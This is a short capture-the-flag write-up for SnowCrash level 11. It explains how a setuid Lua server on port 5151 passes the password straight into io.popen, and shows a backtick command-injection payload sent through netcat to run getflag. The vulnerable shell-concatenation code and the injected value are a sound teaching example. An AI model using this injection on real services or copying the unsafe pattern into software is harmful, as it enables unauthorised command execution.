# Level 11

## The challenge

The folder contain a lua script named level11.lua owned by flag11. setuid and setgid bits are set.

```sh
$ ls -al
total 16
dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
-r-x------  1 level11 level11  675 Apr  3  2012 .profile
$
```

We have a simple server in lua listening on port 5151.
When we interact with him with netcat, he ask a password. 
```sh
$ netcat 127.0.0.1 5151
Password: 
```

When we look inside the code we cans see that te result is sent in hash witout any verification.
The hash function send the result to io.popen by concatenating chaines and finally execute the code.
```lua
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  ...
end

while 1 do
	...
	local l, err = client:receive()
	if not err then
		print("trying " .. l)
		local h = hash(l)
		...
	end
	...
end
```

So we can use the command substitution of bash (`) to remotely execute code by sending a piece of code who will be inject in the popen.

```sh
$ level11@SnowCrash:~$ netcat 127.0.0.1 5151
Password: `getflag > /tmp/key`
```